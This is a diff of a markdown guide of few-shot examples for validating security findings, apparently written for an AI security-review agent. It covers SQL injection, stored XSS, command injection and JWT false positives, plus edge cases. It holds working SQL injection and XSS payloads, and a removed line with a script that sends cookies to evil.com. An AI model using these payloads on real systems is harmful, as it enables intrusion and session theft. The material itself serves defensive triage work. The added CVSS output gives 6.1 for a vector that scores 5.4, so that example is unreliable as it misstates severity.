@@ -1,6 +1,6 @@
 # Vulnerability validation examples (Phase 3)
 
-This document provides few-shot examples showing how to validate security findings during Phase 3. Each example demonstrates the reasoning process for determining if a vulnerability is real and exploitable. Read this when you need guidance on confirming or rejecting a finding.
+This document provides few-shot examples for Phase 4 (validating a finding in an isolated context, with a refute-first mindset) and Phase 5 (PoC, CVSS, record verification). Outputs follow the response contract in `vulnerability-validation.md` exactly.
 
 ---
 
@@ -15,107 +15,87 @@ This document provides few-shot examples showing how to validate security findin
   "vulnerability_type": "SQL Injection",
   "file": "src/api/users.js",
   "line_range": "45-49",
-  "code_snippet": "const sql = `SELECT * FROM users WHERE name LIKE '%${query}%'`;"
+  "code_context": "const sql = `SELECT * FROM users WHERE name LIKE '%${query}%'`;"
 }
 ```
 
-### Validation process
+### Refutation attempt
 
-**Step 1: Reachability analysis**
-
-Tracing from entry point:
+**1. Reachability** — traced from the entry point:
 
 1. `GET /api/users` → `routes/users.js:12`
 2. `usersRouter.get('/')` → `controllers/userController.js:28`
 3. `searchUsers(req.query.search)` → `src/api/users.js:45` (vulnerable code)
 
-Reachability: `EXTERNAL` - Accessible via unauthenticated HTTP endpoint.
+Reachability: `EXTERNAL` — unauthenticated HTTP endpoint. No middleware runs before the handler.
 
-**Step 2: Control flow analysis**
+**2. Control flow / attacker control** — source: `req.query.search` (HTTP query parameter) → passed directly to `searchUsers()` → interpolated into the SQL template literal → executed via `db.query(sql)`. No validation, encoding, or transformation anywhere on the path. Attacker control: FULL.
 
-Data flow:
+**3. Mitigations searched for and not found** — no input validation middleware on the route; raw SQL, not ORM parameterization; no WAF or SQLi protection. The threat model's "Existing Mitigations" for this threat lists none — verified against the code.
 
-1. Source: `req.query.search` (HTTP query parameter)
-2. Passed directly to `searchUsers()` function
-3. Interpolated into SQL string without sanitization
-4. Executed via `db.query(sql)`
+**4. Exploitability** — `EASY`: standard technique, browser or curl, no conditions.
 
-Attacker control: FULL - No validation, encoding, or transformation.
+**Refutation failed**: no validation, no framework protection, no unreachable branch. The path from attacker-controlled source to sink is complete.
 
-**Step 3: Mitigation assessment**
-
-- Input validation: NONE
-- Framework protection: Raw SQL query, not using ORM
-- Security middleware: No WAF or SQL injection protection detected
-- Threat model reference: Section 5.2 lists this as a gap
-
-**Step 4: Exploitability assessment**
-
-Rating: `EASY`
-
-- Standard SQL injection technique
-- No special conditions required
-- Publicly known attack pattern
-- Can be exploited with browser or curl
-
-**Step 5: Proof of concept**
-
-```json
-{
-  "payload": "test%' OR '1'='1' --",
-  "request": "GET /api/users?search=test%25'%20OR%20'1'%3D'1'%20--",
-  "expected_behavior": "Returns users with 'test' in name",
-  "actual_behavior": "Returns ALL users in database"
-}
-```
-
-**Step 6: CVSS calculation**
-
-- Attack Vector: Network (N)
-- Attack Complexity: Low (L)
-- Privileges Required: None (N)
-- User Interaction: None (N)
-- Scope: Unchanged (U)
-- Confidentiality: High (H) - Can read all data
-- Integrity: High (H) - Can modify data
-- Availability: None (N)
-
-Vector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`
-Score: **9.1 (Critical)**
-
-### Output
+### Validator response (Phase 4 contract)
 
 ```json
 {
   "id": "VULN-001",
   "status": "CONFIRMED",
-  "original_severity": "HIGH",
   "validated_severity": "CRITICAL",
-  "exploitability": "EASY",
+  "confidence": "HIGH",
   "reachability": "EXTERNAL",
-  "existing_mitigations": [],
+  "exploitability": "EASY",
   "exploitation_path": [
-    "Attacker sends GET /api/users?search=<payload>",
-    "Express passes query param to searchUsers()",
-    "Function interpolates input into SQL template literal",
-    "db.query() executes malicious SQL",
-    "All user records returned to attacker"
+    "Attacker sends GET /api/users?search=<payload> (routes/users.js:12)",
+    "Express passes req.query.search to searchUsers() unmodified (controllers/userController.js:28)",
+    "searchUsers interpolates the input into the SQL template literal (src/api/users.js:45)",
+    "db.query() executes the attacker's SQL (src/api/users.js:47)"
   ],
-  "proof_of_concept": {
-    "payload": "test%' OR '1'='1' --",
-    "request": "GET /api/users?search=test%25'%20OR%20'1'%3D'1'%20--",
-    "expected_behavior": "Returns users with 'test' in name",
-    "actual_behavior": "Returns ALL users in database"
-  },
-  "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
-  "cvss_score": 9.1,
-  "validation_notes": "Confirmed. Direct string interpolation in SQL with no input validation. Upgraded to CRITICAL due to ease of exploitation and data exposure."
+  "existing_mitigations": [],
+  "reason": "Refutation failed: no validation, sanitization, or parameterization anywhere on the path from req.query.search to db.query(). Direct SQL interpolation with full attacker control; upgraded to CRITICAL because any unauthenticated caller can read the whole users table.",
+  "evidence": [
+    {"file": "routes/users.js", "line": 12, "note": "public route, no auth middleware"},
+    {"file": "src/api/users.js", "line": 45, "note": "template literal interpolation of user input into SQL"},
+    {"file": "src/api/users.js", "line": 47, "note": "raw db.query() execution, no parameterization"}
+  ],
+  "missing_fact": null
 }
 ```
 
+### Phase 5 (excerpt)
+
+PoC (mandatory — CONFIRMED and CRITICAL):
+
+```json
+{
+  "payload": "test%' OR '1'='1 --",
+  "request": "GET /api/users?search=test%25'%20OR%20'1'%3D%271%20--",
+  "expected_behavior": "Returns users with 'test' in name",
+  "actual_behavior": "Returns ALL users in database"
+}
+```
+
+PoC execution (default policy — execution disabled):
+
+```json
+"poc_executed": false,
+"poc_result": null
+```
+
+CVSS — vector by the agent, score by the script:
+
+```bash
+python3 scripts/cvss-score.py "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
+# {"vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N", "score": 9.1, "version": "3.1"}
+```
+
+Record check: `{"decision": "verified"}` — file/lines exist, every exploitation_path step matches the code, the PoC's route and parameter exist, CRITICAL does not exceed the demonstrated impact (full table read).
+
 ---
 
-## Example 2: False positive - sanitized input
+## Example 2: False positive — sanitized input
 
 ### Input finding
 
@@ -126,60 +106,44 @@ Score: **9.1 (Critical)**
   "vulnerability_type": "SQL Injection",
   "file": "src/api/products.js",
   "line_range": "78-82",
-  "code_snippet": "const sql = `SELECT * FROM products WHERE category = '${category}'`;"
+  "code_context": "const sql = `SELECT * FROM products WHERE category = '${category}'`;"
 }
 ```
 
-### Validation process
+### Refutation attempt
 
-**Step 1: Reachability analysis**
+**1. Reachability** — `GET /api/products` → `routes/products.js:15` → **`validateRequest(categorySchema)` middleware runs FIRST** → `getProducts(req.query.category)` → `src/api/products.js:78`.
 
-Tracing from entry point:
+**2. Control flow** — source: `req.query.category` → validated by Joi schema at `middleware/validation.js:23`: `Joi.string().valid('electronics', 'clothing', 'food', 'other')` → only enum values pass → then interpolated into SQL.
 
-1. `GET /api/products` → `routes/products.js:15`
-2. `productsRouter.get('/')` → `controllers/productController.js:42`
-3. `validateRequest(categorySchema)` middleware runs FIRST
-4. `getProducts(req.query.category)` → `src/api/products.js:78`
+**3. Mitigations found** — the enum validation admits exactly four literal strings; any payload with quotes, spaces, or SQL metacharacters fails with 400 before the handler runs.
 
-**Step 2: Control flow analysis**
+**Refutation succeeded**: the input is restricted to four predefined values before reaching the vulnerable code.
 
-Data flow:
-
-1. Source: `req.query.category` (HTTP query parameter)
-2. **VALIDATED** by Joi schema middleware at `middleware/validation.js:23`
-3. Schema: `Joi.string().valid('electronics', 'clothing', 'food', 'other')`
-4. Only passes if input matches allowed enum values
-5. Then passed to `getProducts()` function
-
-**Step 3: Mitigation assessment**
-
-- Input validation: YES - Joi schema restricts to enum values
-- The malicious SQL characters cannot pass validation
-- Validation happens BEFORE the vulnerable code executes
-
-**Step 4: Exploitability assessment**
-
-Rating: `NOT_EXPLOITABLE`
-
-- Input is restricted to 4 predefined values
-- SQL injection payload would fail Joi validation
-- Request would return 400 Bad Request before reaching vulnerable code
-
-### Output
+### Validator response
 
 ```json
 {
   "id": "VULN-002",
-  "original_severity": "HIGH",
   "status": "FALSE_POSITIVE",
-  "reason": "Input is validated by Joi schema middleware before reaching this code. Schema enforces strict enum values ('electronics', 'clothing', 'food', 'other') which prevents any SQL injection payload from passing through.",
-  "evidence": "See middleware/validation.js:23 - Joi.string().valid('electronics', 'clothing', 'food', 'other'). Middleware applied at routes/products.js:15 before handler."
+  "validated_severity": "MEDIUM",
+  "confidence": "HIGH",
+  "reachability": "EXTERNAL",
+  "exploitability": "NOT_EXPLOITABLE",
+  "exploitation_path": [],
+  "existing_mitigations": ["Joi enum validation in middleware/validation.js:23, applied at routes/products.js:15 before the handler"],
+  "reason": "Input is restricted to four enum values by Joi validation middleware that runs before the handler. No SQL metacharacters can reach the interpolation. Parameterized queries would still be better hygiene, hence MEDIUM severity for the finding record.",
+  "evidence": [
+    {"file": "middleware/validation.js", "line": 23, "note": "Joi.string().valid('electronics','clothing','food','other') — strict enum, rejects everything else with 400"},
+    {"file": "routes/products.js", "line": 15, "note": "validateRequest(categorySchema) applied to the route before the handler"}
+  ],
+  "missing_fact": null
 }
 ```
 
 ---
 
-## Example 3: Confirmed XSS with framework bypass
+## Example 3: Confirmed XSS with framework bypass (MEDIUM)
 
 ### Input finding
 
@@ -190,107 +154,72 @@ Rating: `NOT_EXPLOITABLE`
   "vulnerability_type": "XSS",
   "file": "src/components/UserProfile.jsx",
   "line_range": "34-36",
-  "code_snippet": "<div dangerouslySetInnerHTML={{__html: user.bio}} />"
+  "code_context": "<div dangerouslySetInnerHTML={{__html: user.bio}} />"
 }
 ```
 
-### Validation process
+### Refutation attempt
 
-**Step 1: Reachability analysis**
+**1. Reachability** — component rendered at `/profile/:userId`; profiles are public; `user.bio` is user-editable via profile settings.
 
-1. Component rendered at `/profile/:userId` route
-2. `user.bio` loaded from API: `GET /api/users/:id`
-3. Bio field is user-editable in profile settings
-4. Rendered without authentication (public profiles)
+**2. Control flow** — source: bio input in profile settings form → stored in `users.bio` → returned by `GET /api/users/:id` → rendered with `dangerouslySetInnerHTML`.
 
-Reachability: `EXTERNAL` - Any user can set their bio, any visitor can view it.
+**3. Mitigations searched** — React auto-escaping is **explicitly bypassed** (`dangerouslySetInnerHTML`); no CSP headers configured; no server-side sanitization of bio. The "React is XSS-safe" precedent does not apply — it excludes exactly this API.
 
-**Step 2: Control flow analysis**
+**4. Exploitability** — `EASY`: attacker sets bio to a script/img-onerror payload, victim views the public profile.
 
-Data flow:
+**Refutation failed**: the one framework protection that would apply is explicitly disabled.
 
-1. Source: User input in profile settings form
-2. Stored in database `users.bio` column
-3. Retrieved via API
-4. Rendered with `dangerouslySetInnerHTML` (explicit XSS risk)
-
-Attacker control: FULL - Users can set arbitrary HTML in bio.
-
-**Step 3: Mitigation assessment**
-
-- Input validation: NONE on bio field
-- Framework protection: BYPASSED - `dangerouslySetInnerHTML` disables React's auto-escaping
-- CSP headers: Not configured
-- Server-side sanitization: NONE
-
-**Step 4: Exploitability assessment**
-
-Rating: `EASY`
-
-- Attacker creates account
-- Sets bio to `<script>document.location='https://evil.com/steal?c='+document.cookie</script>`
-- Shares profile link with victim
-- Victim's cookies stolen
-
-**Step 5: Proof of concept**
-
-```json
-{
-  "payload": "<img src=x onerror=\"alert('XSS')\">",
-  "request": "PATCH /api/users/me with body {\"bio\": \"<img src=x onerror=\\\"alert('XSS')\\\">\"}",
-  "expected_behavior": "Bio displayed as text or sanitized HTML",
-  "actual_behavior": "JavaScript executes in victim's browser"
-}
-```
-
-**Step 6: CVSS calculation**
-
-- Attack Vector: Network (N)
-- Attack Complexity: Low (L)
-- Privileges Required: Low (L) - Need account to set bio
-- User Interaction: Required (R) - Victim must view profile
-- Scope: Changed (C) - Can affect other users
-- Confidentiality: Low (L) - Can steal cookies
-- Integrity: Low (L) - Can deface page
-- Availability: None (N)
-
-Vector: `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N`
-Score: **5.4 (Medium)**
-
-### Output
+### Validator response
 
 ```json
 {
   "id": "VULN-003",
   "status": "CONFIRMED",
-  "original_severity": "MEDIUM",
   "validated_severity": "MEDIUM",
-  "exploitability": "EASY",
+  "confidence": "HIGH",
   "reachability": "EXTERNAL",
-  "existing_mitigations": [],
+  "exploitability": "EASY",
   "exploitation_path": [
-    "Attacker creates account and navigates to profile settings",
-    "Attacker sets bio field to malicious HTML/JS payload",
-    "Payload stored in database without sanitization",
-    "Victim visits attacker's public profile page",
-    "React renders bio with dangerouslySetInnerHTML",
-    "Malicious script executes in victim's browser context"
+    "Attacker sets their profile bio to <img src=x onerror=...> via profile settings (no sanitization on the input)",
+    "Payload stored in users.bio",
+    "Victim visits the attacker's public profile /profile/:userId",
+    "UserProfile.jsx renders bio with dangerouslySetInnerHTML (line 34), bypassing React escaping",
+    "Script executes in the victim's browser"
   ],
-  "proof_of_concept": {
-    "payload": "<img src=x onerror=\"alert('XSS')\">",
-    "request": "PATCH /api/users/me with body {\"bio\": \"<img src=x onerror=\\\"alert('XSS')\\\">\"}",
-    "expected_behavior": "Bio displayed as text or sanitized HTML",
-    "actual_behavior": "JavaScript executes in victim's browser"
-  },
-  "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N",
-  "cvss_score": 5.4,
-  "validation_notes": "Confirmed stored XSS. The use of dangerouslySetInnerHTML explicitly bypasses React's XSS protection. No server-side sanitization detected."
+  "existing_mitigations": [],
+  "reason": "Stored XSS: attacker-controlled HTML reaches the DOM through dangerouslySetInnerHTML, which disables React's auto-escaping. No CSP, no server-side sanitization. MEDIUM: requires a victim visit and yields session theft, not server compromise.",
+  "evidence": [
+    {"file": "src/components/UserProfile.jsx", "line": 34, "note": "dangerouslySetInnerHTML with user.bio — explicit React escaping bypass"},
+    {"file": "src/routes/profile.js", "line": 8, "note": "public profile route, no authentication required to view"}
+  ],
+  "missing_fact": null
 }
+```
+
+### Phase 5 (excerpt)
+
+PoC below severity HIGH is optional; included here because it sharpens the finding:
+
+```json
+"proof_of_concept": {
+  "payload": "<img src=x onerror=\"alert('XSS')\">",
+  "request": "PATCH /api/users/me with body {\"bio\": \"<img src=x onerror=\\\"alert('XSS')\\\">\"}",
+  "expected_behavior": "Bio displayed as text or sanitized HTML",
+  "actual_behavior": "JavaScript executes in victim's browser"
+},
+"poc_executed": false,
+"poc_result": null
+```
+
+```bash
+python3 scripts/cvss-score.py "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"
+# {"vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N", "score": 6.1, "version": "3.1"}
 ```
 
 ---
 
-## Example 4: Needs manual review - complex data flow
+## Example 4: NEEDS_MANUAL_REVIEW — missing fact
 
 ### Input finding
 
@@ -301,74 +230,44 @@ Score: **5.4 (Medium)**
   "vulnerability_type": "Command Injection",
   "file": "src/workers/imageProcessor.js",
   "line_range": "56-60",
-  "code_snippet": "exec(`convert ${inputPath} -resize ${size} ${outputPath}`)"
+  "code_context": "exec(`convert ${inputPath} -resize ${size} ${outputPath}`)"
 }
 ```
 
-### Validation process
+### Refutation attempt
 
-**Step 1: Reachability analysis**
+**1. Reachability** — worker code, not directly callable: triggered by messages on the `image-processing` queue; messages are published by the upload endpoint `POST /api/upload`. Indirect EXTERNAL.
 
-1. Code is in a background worker, not directly callable
-2. Triggered by messages on `image-processing` queue
-3. Messages published when users upload images
-4. Upload endpoint: `POST /api/upload`
+**2. Control flow** — the message carries `{ inputPath, size, outputPath }`. The publisher (upload-service) is **a different service, outside this repository**. Whether `size` and `inputPath` are user-controlled and whether they are validated before publishing cannot be determined from this codebase.
 
-Reachability: `EXTERNAL` (indirect via message queue)
+**Refutation inconclusive**: the exec() sink is real and reachable indirectly, but the decisive fact about attacker control lives outside the repository. Exactly one specific fact is missing — this is NEEDS_MANUAL_REVIEW, not a parking place: name the fact.
 
-**Step 2: Control flow analysis**
-
-Data flow:
-
-1. Source: File upload at `POST /api/upload`
-2. Upload handler saves file and publishes to queue
-3. Message contains: `{ inputPath, size, outputPath }`
-4. Worker receives message and runs exec()
-
-**Problem:** Cannot fully trace the data flow:
-
-- Where does `size` parameter come from?
-- Is `inputPath` user-controlled or server-generated?
-- What validation happens in the upload handler?
-- Are there multiple publishers to this queue?
-
-**Step 3: Mitigation assessment**
-
-Unknown:
-
-- Upload handler code is in a different service
-- Cannot verify if parameters are sanitized before publishing
-- Cannot verify if worker validates before exec()
-
-**Step 4: Exploitability assessment**
-
-Rating: `UNKNOWN`
-
-- If `size` comes from user input without validation → EASY to exploit
-- If `inputPath` includes user filename → Potentially exploitable
-- Cannot determine without reviewing upload service
-
-### Output
+### Validator response
 
 ```json
 {
   "id": "VULN-004",
-  "original_severity": "HIGH",
   "status": "NEEDS_MANUAL_REVIEW",
-  "reason": "Complex data flow through message queue prevents full validation. The exec() call is dangerous, but the source of inputPath and size parameters could not be fully traced. These values originate from a different service (upload-service) that publishes to the image-processing queue.",
-  "questions_for_reviewer": [
-    "Where does the 'size' parameter originate? Is it user-controlled?",
-    "Is 'inputPath' derived from user-provided filename or server-generated UUID?",
-    "What validation exists in upload-service before publishing to queue?",
-    "Are there other publishers to the image-processing queue?"
+  "validated_severity": "HIGH",
+  "confidence": "MEDIUM",
+  "reachability": "EXTERNAL",
+  "exploitability": "MEDIUM",
+  "exploitation_path": [],
+  "existing_mitigations": [],
+  "reason": "exec() with interpolated queue-message fields is a real sink, reachable indirectly via POST /api/upload. Whether the interpolated values are attacker-controlled depends on the publisher (upload-service), which is outside this repository, so refutation cannot succeed or fail from source alone.",
+  "evidence": [
+    {"file": "src/workers/imageProcessor.js", "line": 56, "note": "exec() with interpolated inputPath/size/outputPath from queue message"},
+    {"file": "src/routes/upload.js", "line": 30, "note": "publishes to image-processing queue; validation status of published fields not visible here"}
   ],
-  "recommendation": "If any of these parameters are user-controlled, this is a critical command injection vulnerability. Review upload-service code at src/handlers/upload.js."
+  "missing_fact": "Whether upload-service validates inputPath and size before publishing to the image-processing queue (publisher source is outside this repository)"
 }
 ```
 
+In the artifact this becomes a `needs_manual_review` entry with `reason_code: "missing_fact"`.
+
 ---
 
-## Example 5: False positive - framework protection
+## Example 5: False positive — server-signed JWT input
 
 ### Input finding
 
@@ -379,59 +278,100 @@ Rating: `UNKNOWN`
   "vulnerability_type": "SQL Injection",
   "file": "src/repositories/orderRepository.js",
   "line_range": "23-25",
-  "code_snippet": "return db.query(`SELECT * FROM orders WHERE user_id = ${userId}`);"
+  "code_context": "return db.query(`SELECT * FROM orders WHERE user_id = ${userId}`);"
 }
 ```
 
-### Validation process
+### Refutation attempt
 
-**Step 1: Reachability analysis**
+**1. Reachability** — `GET /api/orders`, behind JWT authentication middleware.
 
-1. Called from `GET /api/orders` endpoint
-2. Requires authentication (JWT middleware)
-3. `userId` extracted from JWT token: `req.user.id`
+**2. Control flow** — `userId` is `req.user.id`, set by auth middleware from a **server-signed JWT**; the id is a UUID generated at registration. The attacker cannot modify their token payload without the signing secret.
 
-**Step 2: Control flow analysis**
+**3. Mitigations found** — the "user id from a signed JWT is not attacker-controlled" precedent applies directly (verified: middleware/auth.js:15 verifies the signature before the route runs).
 
-Data flow:
+**Refutation succeeded**: the interpolated value is server-controlled.
 
-1. Source: `req.user.id` from JWT token
-2. JWT is signed by server with secret key
-3. User cannot modify their own `id` in the token
-4. Server generates `id` as UUID on registration
-
-Key insight: `userId` is NOT user-controlled input. It comes from a server-signed JWT.
-
-**Step 3: Mitigation assessment**
-
-- The `userId` value is extracted from a cryptographically signed JWT
-- Users cannot forge or modify the JWT payload without the secret
-- The `id` is a UUID generated by the server, not user input
-- Even though string interpolation is used, the input is trusted
-
-**Step 4: Exploitability assessment**
-
-Rating: `NOT_EXPLOITABLE`
-
-- Attacker cannot control the `userId` value
-- Would need to compromise JWT signing secret
-- At that point, SQL injection would be the least of the problems
-
-### Output
+### Validator response
 
 ```json
 {
   "id": "VULN-005",
-  "original_severity": "MEDIUM",
   "status": "FALSE_POSITIVE",
-  "reason": "The userId parameter is not user-controlled. It is extracted from a server-signed JWT token (req.user.id) after authentication middleware verifies the signature. Users cannot modify their ID in the token without the signing secret. While using parameterized queries would still be best practice, this is not exploitable as SQL injection.",
-  "evidence": "Authentication middleware at middleware/auth.js:15 verifies JWT. User ID is set during registration as UUID (services/auth.js:45) and embedded in signed token."
+  "validated_severity": "LOW",
+  "confidence": "HIGH",
+  "reachability": "AUTHENTICATED",
+  "exploitability": "NOT_EXPLOITABLE",
+  "exploitation_path": [],
+  "existing_mitigations": ["JWT signature verification in middleware/auth.js:15; userId is a server-generated UUID from the signed token"],
+  "reason": "userId comes from req.user.id, set by auth middleware from a server-signed JWT. The value is not attacker-controlled without the signing secret. Parameterization would still be best practice, hence LOW.",
+  "evidence": [
+    {"file": "middleware/auth.js", "line": 15, "note": "jwt.verify() runs before the route; req.user.id comes from the signed payload"},
+    {"file": "services/auth.js", "line": 45, "note": "id is a server-generated UUID assigned at registration"}
+  ],
+  "missing_fact": null
 }
 ```
 
 ---
 
+## Edge cases
+
+### Invalid validator output
+
+First response for VULN-006 arrives wrapped in prose and misses `evidence`. Do not repair it. Re-run once with a fresh agent. The second response is valid → use it. Had the second response also been invalid:
+
+```json
+{
+  "id": "VULN-006",
+  "reason_code": "validator_output_invalid",
+  "reason": "validator returned contract-invalid output twice",
+  "missing_fact": null,
+  "evidence": []
+}
+```
+
+### Validation budget
+
+18 candidates, `validation.max_findings: 15`. The 15 highest by severity (then confidence) are validated; the 3 remainder:
+
+```json
+{
+  "id": "VULN-016",
+  "reason_code": "validation_budget",
+  "reason": "not validated: 18 candidates exceeded the validation budget of 15",
+  "missing_fact": null,
+  "evidence": []
+}
+```
+
+### Degraded (sequential) mode — honest marking
+
+No subagents available: findings are validated one by one in the same context, and the record check is done by the same context. The artifact must say so:
+
+```json
+"validation_meta": {
+  "validation_isolation": "sequential",
+  "record_verification": "self"
+}
+```
+
+…and `report.md` carries one header line: "Validation ran in sequential mode (no isolated validators); record verification was self-review."
+
+### Anti-escalation on record verification
+
+The verifier of VULN-007 (CONFIRMED MEDIUM) responds with `replace` and a record marked CONFIRMED HIGH. Applying it would upgrade the verdict — forbidden. The upgrade is discarded; the finding goes back to Phase 4 for full re-validation. A `replace` that only fixes `line_range` and rewords two `exploitation_path` steps (same status, same severity) applies directly and is re-verified once by a different fresh agent.
+
+---
+
 ## Key takeaways
+
+### The refute-first mindset
+
+- You did not write the finding — hunt for the reason it is wrong before concluding it is right
+- CONFIRMED requires a failed refutation AND a complete, code-anchored exploitation path
+- NEEDS_MANUAL_REVIEW names exactly one decisive missing fact; it is not a doubt bucket
+- FALSE_POSITIVE names the code that refutes the finding
 
 ### When to confirm
 
@@ -444,12 +384,6 @@ Rating: `NOT_EXPLOITABLE`
 
 - Input is validated/sanitized before reaching vulnerable code
 - Framework provides automatic protection that's enabled
-- The "user input" is actually server-controlled (e.g., from signed token)
+- The "user input" is actually server-controlled (e.g., from a signed token)
 - Code is unreachable from any entry point
-
-### When to request manual review
-
-- Complex data flows across services or queues
-- Cannot fully trace input source
-- Validation exists but uncertain if it's sufficient
-- Requires domain knowledge to assess impact
+- The finding matches a hard exclusion or precedent
